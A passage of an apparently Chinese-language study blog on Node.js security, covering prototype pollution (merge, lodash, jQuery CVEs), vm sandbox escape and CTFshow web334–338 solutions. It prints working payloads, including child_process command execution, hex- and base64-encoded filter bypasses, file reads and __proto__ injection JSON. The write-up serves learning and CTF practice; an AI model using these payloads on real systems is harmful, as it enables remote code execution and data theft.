class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//fooæ˜¯ä¸€ä¸ªç®€å•çš„JavaScriptå¯¹è±¡</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>:<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//foo.bar æ­¤æ—¶ä¸º1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¿®æ”¹fooçš„åŸå‹ (å³Object)</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;calc&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› , foo.barä»ç„¶æ˜¯1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(foo.__proto__)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"><span class="comment">// æŸ¥çœ‹zoo.bar</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230519225132549.png" alt="image-20230519225132549"></p><h4 id="vmæ²™ç®±é€ƒé€¸"><a href="#vmæ²™ç®±é€ƒé€¸" class="headerlink" title="vmæ²™ç®±é€ƒé€¸"></a>vmæ²™ç®±é€ƒé€¸</h4><h4 id="mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“"><a href="#mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“"></a>mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“</h4><p>å…¶å®æ‰¾æ‰¾èƒ½å¤Ÿæ§åˆ¶æ•°ç»„(å¯¹è±¡)çš„â€é”®åâ€çš„æ“ä½œå³å¯è®¾ç½®<code>__proto__</code>çš„å€¼</p><ul><li>å¯¹è±¡merge</li><li>å¯¹è±¡clone (å…¶å®å†…æ ¸å°±æ˜¯å°†å¾…æ“ä½œçš„å¯¹è±¡mergeåˆ°ä¸€ä¸ªç©ºå¯¹è±¡ä¸­)</li></ul><p>mergeæ“ä½œæ—¶æœ€å¸¸è§çš„å¯èƒ½æ§åˆ¶é”®åçš„æ“ä½œ, ä¹Ÿæœ€å¯èƒ½è¢«åŸå‹é“¾æ”»å‡»</p><p>ä»¥å¯¹è±¡mergeä¸ºä¾‹, æˆ‘ä»¬æƒ³è±¡ä¸€ä¸ªç®€å•çš„mergeå‡½æ•°:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source)&#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source&amp;&amp; key <span class="keyword">in</span> target)&#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">            </span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨åˆå¹¶è¿‡ç¨‹ä¸­, å­˜åœ¨èµ‹å€¼çš„æ“ä½œ<code>target[key] = source[key]</code>, é‚£ä¹ˆ, è¿™ä¸ªkeyå¦‚æœæ˜¯<code>__proto__</code>(jsonæ ¼å¼æ‰å¯ä»¥è¢«å½“æˆkey), æ˜¯ä¸æ˜¯å°±å¯ä»¥åŸå‹æ±¡æŸ“</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source)&#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source&amp;&amp; key <span class="keyword">in</span> target)&#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> object1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> object2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;:1, &quot;__proto__&quot;:&#123;&quot;b&quot;:2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(object1, object2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object1.<span class="property">a</span> , object1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">object3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object3.<span class="property">b</span>)</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„ç‚¹æ˜¯ï¼š</p><p>åœ¨JSONè§£æçš„æƒ…å†µä¸‹ï¼Œ<code>__proto__</code>ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ï¼Œæ‰€ä»¥åœ¨éå†object2çš„æ—¶å€™ä¼šå­˜åœ¨è¿™ä¸ªé”®ã€‚</p><h4 id="ejsæ±¡æŸ“"><a href="#ejsæ±¡æŸ“" class="headerlink" title="ejsæ±¡æŸ“"></a>ejsæ±¡æŸ“</h4><p>å‚è€ƒ: <a class="link" target="_blank" rel="noopener" href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">Express+lodash+ejs: ä»åŸå‹é“¾æ±¡æŸ“åˆ°RCE - evi0sâ€™ Blog<i class="fas fa-external-link-alt"></i></a></p><h4 id="lodashæ±¡æŸ“"><a href="#lodashæ±¡æŸ“" class="headerlink" title="lodashæ±¡æŸ“"></a>lodashæ±¡æŸ“</h4><p>å‚è€ƒ: CVE-2019-10744</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loadash.<span class="title function_">defaultsDeep</span>(obj.<span class="property">JSON</span>.<span class="title function_">parse</span>(objstr));</span><br></pre></td></tr></table></figure><p>åªéœ€è¦æœ‰<code>objstr</code>ä¸º</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;content&quot;</span>:&#123;<span class="string">&quot;prototype&quot;</span>:&#123;<span class="string">&quot;constructor&quot;</span>:&#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;b&quot;</span>&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>åœ¨åˆå¹¶æ—¶ä¾¿ä¼šåœ¨Objectä¸Šé™„åŠ a=bè¿™æ ·ä¸€ä¸ªå±æ€§</p><p>lodashæ˜¯ä¸€ä¸ªéå¸¸æµè¡Œçš„JavaScriptå·¥å…·åº“</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mergeFn = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>).<span class="property">defaultsDeep</span>;</span><br><span class="line"><span class="keyword">const</span> payload = <span class="string">&#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;a0&quot;: true&#125;&#125;&#125;&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">mergeFn</span>(&#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(payload));</span><br><span class="line">    <span class="keyword">if</span> ((&#123;&#125;)[<span class="string">`a0`</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Vulnerable to Prototype Pollution via <span class="subst">$&#123;payload&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_">check</span>();</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¸Šé¢çš„jsè¯­å¥ï¼Œå°±å¯ä»¥æ£€æŸ¥è¿™ä¸ªç‰ˆæœ¬çš„lodashæ˜¯å¦å­˜åœ¨è¿™ä¸ªæ¼æ´ã€‚</p><p>å…¶ä¸­æ¼æ´å…³é”®è§¦å‘ç‚¹åœ¨<code>defaultsDeep</code>å‡½æ•°ï¼Œå®ƒå°†<code>(&#123;&#125;, JSON.parse(payload))</code>mergeæ—¶ï¼Œå°±å¯èƒ½å¯¼è‡´åŸå‹é“¾æ±¡æŸ“ã€‚ä½¿ç”¨JSON.parseå°±æ˜¯ä¿è¯åˆå¹¶æ—¶èƒ½ä»¥å­—å…¸è§£æï¼Œè€Œä¸æ˜¯å­—ç¬¦ä¸²</p><h4 id="JQueryæ±¡æŸ“"><a href="#JQueryæ±¡æŸ“" class="headerlink" title="JQueryæ±¡æŸ“"></a>JQueryæ±¡æŸ“</h4><p>å‚è€ƒ: CVE-2019-11358</p><p>ç‰ˆæœ¬å°äº3.4.0æ—¶ JQueryå­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$.<span class="title function_">extend</span>(<span class="params"><span class="literal">true</span>,&#123;&#125;,<span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;aa&quot;:&quot;hello&quot;&#125;&#125;&#x27;</span>)</span>)</span><br><span class="line">&#123;<span class="attr">aa</span>: <span class="string">&#x27;hello&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">var</span> b = <span class="number">1.2</span>;</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">b.<span class="property">aa</span>;</span><br><span class="line"><span class="string">&#x27;hello&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230522211842808.png" alt="image-20230522211842808"></p><p>Jqueryå¯ä»¥ç”¨<code>$.extend</code>å°†ä¸¤ä¸ªå­—å…¸mergeï¼Œè€Œè¿™ä¹Ÿå› æ­¤æ±¡æŸ“äº†åŸå‹é“¾ã€‚</p><h4 id="vmæ²™ç®±é€ƒé€¸-1"><a href="#vmæ²™ç®±é€ƒé€¸-1" class="headerlink" title="vmæ²™ç®±é€ƒé€¸"></a>vmæ²™ç®±é€ƒé€¸</h4><p>å‚è€ƒ: mongo-express RCE(CVE-2019-10758)</p><p>vmæ˜¯ç”¨æ¥å®ç°ä¸€ä¸ªæ²™ç®±ç¯å¢ƒï¼Œå¯ä»¥å®‰å…¨çš„æ‰§è¡Œä¸å—ä¿¡ä»»çš„ä»£ç è€Œä¸ä¼šå½±å“åˆ°ä¸»ç¨‹åºã€‚ä½†æ˜¯å¯ä»¥é€šè¿‡æ„é€ è¯­å¥æ¥è¿›è¡Œé€ƒé€¸</p><p>ä¾‹å­</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> env = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.constructor.constructor(&#x27;return this.process.env&#x27;)()`</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(env);</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä¹‹åå¯ä»¥è·å–ä¸»ç¨‹åºç¯å¢ƒä¸­çš„ç¯å¢ƒå˜é‡</p><p>ä¸Šé¢ä»£ç ç­‰ä»·äºä¸‹é¢ä»£ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(<span class="string">&quot;this.constructor.constructor(&#x27;return this.process.env&#x27;)()&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">env = script.<span class="title function_">runInContext</span>(context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(env);</span><br></pre></td></tr></table></figure><p>åˆ›å»ºvmç¯å¢ƒæ—¶, é¦–å…ˆè¦åˆå§‹åŒ–ä¸€ä¸ªå¯¹è±¡<code>sandbox</code>, è¿™ä¸ªå¯¹è±¡å°±æ˜¯vmä¸­è„šæœ¬æ‰§è¡Œæ—¶çš„å…¨å±€ç¯å¢ƒcontext, vmè„šæœ¬ä¸­å…¨å±€thisæŒ‡å‘çš„å°±æ˜¯è¿™ä¸ªå¯¹è±¡</p><p>å› ä¸º<code>this.constructor.constructor</code>è¿”å›çš„æ˜¯ä¸€ä¸ª<code>Function constructor</code>, æ‰€ä»¥å¯ä»¥åˆ©ç”¨functionå¯¹è±¡æ„é€ ä¸€ä¸ªå‡½æ•°å¹¶æ‰§è¡Œ. (æ­¤æ—¶functionå¯¹è±¡çš„ä¸Šä¸‹æ–‡ç¯å¢ƒå°±æ˜¯å¤„äºä¸»ç¨‹åºä¸­çš„)è¿™é‡Œæ„é€ å‡½æ•°å†…çš„è¯­å¥æ˜¯<code>return this.process.env</code>, ç»“æœæ˜¯è¿”å›äº†ä¸»ç¨‹åºçš„ç¯å¢ƒå˜é‡</p><p>é…åˆ<code>chile_process.exec()</code>å°±å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤äº†:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> env = vm.<span class="title function_">runInNewContext</span>(<span class="string">`const process = this.constructor.constructor(&#x27;return this.process&#x27;)();process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;).toString()`</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(env);</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230522213535305.png" alt="image-20230522213535305"></p><h3 id="åšå‡ ä¸ªé¢˜-CTFshow"><a href="#åšå‡ ä¸ªé¢˜-CTFshow" class="headerlink" title="åšå‡ ä¸ªé¢˜(CTFshow)"></a>åšå‡ ä¸ªé¢˜(CTFshow)</h3><h4 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h4><p>ç”±å‰ç½®çŸ¥è¯†å¯çŸ¥</p><blockquote><p>åœ¨Character.toUpperCase()å‡½æ•°ä¸­ï¼Œå­—ç¬¦Ä±ä¼šè½¬å˜ä¸ºIï¼Œå­—ç¬¦Å¿ä¼šå˜ä¸ºSã€‚<br>åœ¨Character.toLowerCase()å‡½æ•°ä¸­ï¼Œå­—ç¬¦Ä°ä¼šè½¬å˜ä¸ºiï¼Œå­—ç¬¦â„ªä¼šè½¬å˜ä¸ºkã€‚</p></blockquote><p>æ‰€ä»¥ç”¨ctfÅ¿how 123456ç™»å½•å°±å¯ä»¥å‡ºflagäº†</p><p>ä½†æ˜¯è¿™é¢˜å…¶å®ç›´æ¥ç”¨å°å†™çš„<code>ctshow</code>å°±å¯ä»¥ç»•è¿‡</p><h4 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h4><p>çœ‹è§æç¤º<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230523212452706.png" alt="image-20230523212452706"></p><p>çŒœæµ‹åç«¯ä¸º<code>eval()</code>ä»£ç æ‰§è¡Œ</p><p>å°è¯•ä¸€ä¸‹rce</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;tac f*&#x27;</span>).<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230523212854074.png" alt="image-20230523212854074"></p><p>ä¹Ÿå¯ä»¥å€Ÿé‰´yuå¸ˆå‚…çš„</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>( <span class="string">&#x27;child_process&#x27;</span> ).<span class="title function_">spawnSync</span>( <span class="string">&#x27;tac&#x27;</span>, [ <span class="string">&#x27;fl00g.txt&#x27;</span> ] ).<span class="property">stdout</span>.<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure><p>æˆ–è€…ä½¿ç”¨<code>fs</code>è¯»æ–‡ä»¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readdirSync</span>(<span class="string">&#x27;.&#x27;</span>)  <span class="comment">//æŸ¥çœ‹å½“å‰ç›®å½•</span></span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;fl00g.txt&#x27;</span>) <span class="comment">//è¯»å–æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><h4 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h4><p>è¿‡æ»¤äº†<code>execSync</code></p><p>å¯ä»¥ä½¿ç”¨ä¸Šé¢è¯´çš„<code>spawnSync</code>æˆ–è€…<code>fs</code></p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨æ‹¼æ¥ç»•è¿‡/ç¼–ç ç»•è¿‡ç­‰ç­‰</p><p>è¿™é‡Œç®€å•å†™å‡ ä¸ªpayload, å…¶å®æ˜¯ä¸Šé¢<strong>RCE_ByPass</strong>å·²ç»æåˆ°è¿‡çš„</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&quot;exe&quot;</span>.<span class="title function_">concat</span>(<span class="string">&quot;cSync&quot;</span>)](<span class="string">&quot;ls&quot;</span>).<span class="title function_">toString</span>() <span class="comment">//æ‹¼æ¥ç»•è¿‡</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&quot;\x65\x78\x65\x63\x53\x79\x6e\x63&quot;</span>](<span class="string">&#x27;calc&#x27;</span>).<span class="title function_">toString</span>() <span class="comment">//ç¼–ç ç»•è¿‡</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&quot;\u0065\u0078\u0065\u0063\u0053\x79\x6e\x63&quot;</span>](<span class="string">&#x27;calc&#x27;</span>).<span class="title function_">toString</span>()</span><br><span class="line"><span class="built_in">eval</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCd0YWMgZionKTs=&#x27;</span>,<span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>());</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230523220634108.png" alt="image-20230523220634108"></p><h4 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">md5</span>(<span class="params">s</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .<span class="title function_">update</span>(s)</span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> b = req.<span class="property">query</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line">  	res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  	res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>md5ç»•è¿‡ like php</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a[x]=<span class="number">1</span>&amp;b[x]=<span class="number">2</span></span><br><span class="line">b[]=<span class="number">1</span>&amp;a[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230523222425835.png" alt="image-20230523222425835"></p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230523222603331.png" alt="image-20230523222603331"></p><h4 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h4><p>é‡ç‚¹åœ¨äº<code>login.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°flagå°±åœ¨è¿™é‡Œ, è¦æƒ³è·å¾—flag, å°±éœ€è¦ä½¿å¾—<code>secert.ctfshow===&#39;36dboy&#39;</code>, æˆ‘ä»¬å¯ä»¥å‘ç°è¿™é‡Œæœ‰ä¸ª<code>utils.copy</code> , å°±ç±»ä¼¼äº<code>merge</code>å‡½æ•°, å­˜åœ¨åŸå‹æ±¡æŸ“</p><p>payload:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;ctfhsow&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;ctfhsow&quot;</span>,</span><br><span class="line"><span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;ctfshow&quot;</span>:<span class="string">&quot;36dboy&quot;</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230610224701902.png" alt="image-20230610224701902"></p></div><ul class="post-tags-box"><li class="tag-item"><a href="/tags/Web/">#Web</a>&nbsp;</li><li class="tag-item"><a href="/tags/Study/">#Study</a>&nbsp;</li><li 